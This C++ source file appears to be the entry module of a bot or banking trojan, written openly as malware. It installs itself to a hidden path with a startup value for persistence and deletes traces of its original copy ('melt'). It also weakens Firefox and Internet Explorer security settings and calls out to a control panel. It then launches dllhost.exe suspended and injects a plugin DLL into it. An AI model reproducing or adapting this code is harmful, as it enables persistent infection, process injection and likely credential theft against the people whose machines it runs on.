#pragma comment(linker, "/ENTRY:Entry")

#include "..\Common.h"

#define RUN_DEBUG FALSE

static void Install(char *path)
{
   //melt
   char temp[MAX_PATH];
   GetTempPathBotPrefix(temp);
   HANDLE hFile = Funcs::pCreateFileA
   (
      temp, 
      GENERIC_WRITE, 
      0, 
      NULL, 
      CREATE_ALWAYS, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   DWORD written;
   Funcs::pWriteFile(hFile, path, Funcs::pLstrlenA(path), &written, NULL);
   Funcs::pCloseHandle(hFile);
   //end melt

   char installPath[MAX_PATH] = { 0 };
   GetInstallPath(installPath);
   Funcs::pCopyFileA(path, installPath, FALSE);
   SetStartupValue(installPath);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };

   startupInfo.cb = sizeof(startupInfo);

   Funcs::pCreateProcessA(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void Run()
{
   SetFirefoxPrefs();
   DisableMultiProcessesAndProtectedModeIe();
   InitPanelRequest();
   BYTE *mainPluginPe = NULL;
   
   GetDlls(&mainPluginPe, NULL, FALSE);

   char dllhostPath[MAX_PATH] = { 0 };
   
   Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, dllhostPath);

   Funcs::pLstrcatA(dllhostPath, Strs::fileDiv);
   Funcs::pLstrcatA(dllhostPath, Strs::dllhostExe);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };

   startupInfo.cb = sizeof(startupInfo);

   Funcs::pCreateProcessA(dllhostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo); 
   InjectDll(mainPluginPe, processInfo.hProcess, FALSE);
}

void Entry()
{
   InitApi();
   char  botId  [BOT_ID_LEN] = { 0 };
   char  exePath[MAX_PATH]   = { 0 };
   char *exeName;
   GetBotId(botId);
   HANDLE hMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
   if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
      Funcs::pExitProcess(0);
   Funcs::pReleaseMutex(hMutex);
   Funcs::pCloseHandle(hMutex);
#if(RUN_DEBUG)
   Run();
#else
   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);
   exeName = Funcs::pPathFindFileNameA(exePath);
   if(Funcs::pStrncmp(botId, exeName, Funcs::pLstrlenA(botId)) != 0)
      Install(exePath);
   else
      Run();
#endif
   Funcs::pExitProcess(0);
}